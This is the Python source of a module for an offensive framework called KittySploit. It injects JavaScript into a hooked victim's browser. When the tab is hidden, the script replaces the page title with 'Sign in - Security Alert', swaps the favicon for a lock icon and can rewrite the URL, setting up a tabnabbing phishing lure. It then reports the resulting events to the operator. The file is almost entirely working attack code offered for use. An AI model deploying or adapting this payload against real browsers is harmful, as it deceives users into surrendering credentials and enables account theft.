from kittysploit import *
import json
import time
import uuid


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Tabnabbing",
		"description": "When the tab becomes hidden, swap title/favicon (and optional replaceState URL) for phishing",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	fake_title = OptString("Sign in - Security Alert", "Title shown while tab is hidden", False)
	fake_favicon = OptString(
		"",
		"Favicon URL while hidden (empty = generated lock SVG data URI)",
		False,
	)
	fake_path = OptString(
		"",
		"Optional path for history.replaceState while hidden (same-origin only)",
		False,
	)
	restore_on_visible = OptBool(True, "Restore original title/favicon/URL when tab is visible again", False)
	timeout = OptInteger(45, "How long to keep the nabber installed (seconds)", False)

	def run(self):
		fake_title = str(self.fake_title or "Sign in - Security Alert")
		fake_favicon = str(self.fake_favicon or "").strip()
		fake_path = str(self.fake_path or "").strip()
		restore = self._to_bool(self.restore_on_visible)
		timeout_s = max(5, int(self.timeout or 45))
		job_id = str(uuid.uuid4())[:8]

		default_icon = (
			"data:image/svg+xml," +
			"%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E"
			"%3Crect width='64' height='64' rx='12' fill='%231d4ed8'/%3E"
			"%3Cpath d='M32 14a10 10 0 00-10 10v6h4v-6a6 6 0 1112 0v6h4v-6a10 10 0 00-10-10zm-12 20h24v18H20z' fill='white'/%3E"
			"%3C/svg%3E"
		)

		code_js = f"""
		(function() {{
			const FAKE_TITLE = {json.dumps(fake_title)};
			const FAKE_ICON = {json.dumps(fake_favicon or default_icon)};
			const FAKE_PATH = {json.dumps(fake_path)};
			const RESTORE = {str(restore).lower()};
			const JOB = {json.dumps(job_id)};
			const TIMEOUT_MS = {timeout_s * 1000};

			if (window.__ksTabnab && window.__ksTabnab.stop) {{
				try {{ window.__ksTabnab.stop(); }} catch (e) {{}}
			}}

			const state = {{
				originalTitle: document.title,
				originalHref: location.href,
				originalIconHref: null,
				nabbed: false,
				events: []
			}};

			function currentIcon() {{
				const link = document.querySelector("link[rel*='icon']");
				return link ? link.href : null;
			}}
			state.originalIconHref = currentIcon();

			function setIcon(href) {{
				let link = document.querySelector("link[rel*='icon']");
				if (!link) {{
					link = document.createElement('link');
					link.rel = 'icon';
					document.head.appendChild(link);
				}}
				link.href = href;
			}}

			function nab() {{
				if (state.nabbed) return;
				state.nabbed = true;
				document.title = FAKE_TITLE;
				setIcon(FAKE_ICON);
				if (FAKE_PATH) {{
					try {{
						history.replaceState({{ ksTabnab: true }}, FAKE_TITLE, FAKE_PATH);
					}} catch (e) {{
						state.events.push({{ type: 'replaceState_error', error: e.message || String(e) }});
					}}
				}}
				state.events.push({{ type: 'nabbed', ts: Date.now(), title: FAKE_TITLE }});
			}}

			function restoreAll() {{
				if (!RESTORE || !state.nabbed) return;
				document.title = state.originalTitle;
				if (state.originalIconHref) setIcon(state.originalIconHref);
				if (FAKE_PATH) {{
					try {{
						history.replaceState({{}}, state.originalTitle, state.originalHref);
					}} catch (e) {{}}
				}}
				state.nabbed = false;
				state.events.push({{ type: 'restored', ts: Date.now() }});
			}}

			function onVis() {{
				if (document.hidden) nab();
				else restoreAll();
			}}

			document.addEventListener('visibilitychange', onVis);
			// If already hidden when installed
			if (document.hidden) nab();

			window.__ksTabnab = {{
				job: JOB,
				stop: function() {{
					document.removeEventListener('visibilitychange', onVis);
					restoreAll();
					window.__ksTabnab = null;
				}}
			}};

			return new Promise(function(resolve) {{
				setTimeout(function() {{
					try {{ window.__ksTabnab && window.__ksTabnab.stop(); }} catch (e) {{}}
					resolve(JSON.stringify({{
						ok: true,
						job: JOB,
						page_url: location.href,
						original_title: state.originalTitle,
						fake_title: FAKE_TITLE,
						fake_path: FAKE_PATH || null,
						events: state.events,
						currently_hidden: !!document.hidden
					}}));
				}}, TIMEOUT_MS);
			}});
		}})();
		"""

		print_status(f"Installing tabnabber for {timeout_s}s (switch tabs to trigger)...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(timeout_s + 15))
		if not result:
			print_error("Failed to run tabnabbing")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse response: {exc}")
			return False

		print_info("=" * 60)
		print_info("Tabnabbing")
		print_info(f"  Page: {data.get('page_url')}")
		print_info(f"  Original title: {data.get('original_title')}")
		print_info(f"  Fake title: {data.get('fake_title')}")
		events = data.get("events") or []
		print_success(f"  Events: {len(events)}")
		for ev in events:
			print_info(f"    {ev.get('type')} @ {ev.get('ts')}")
		return True
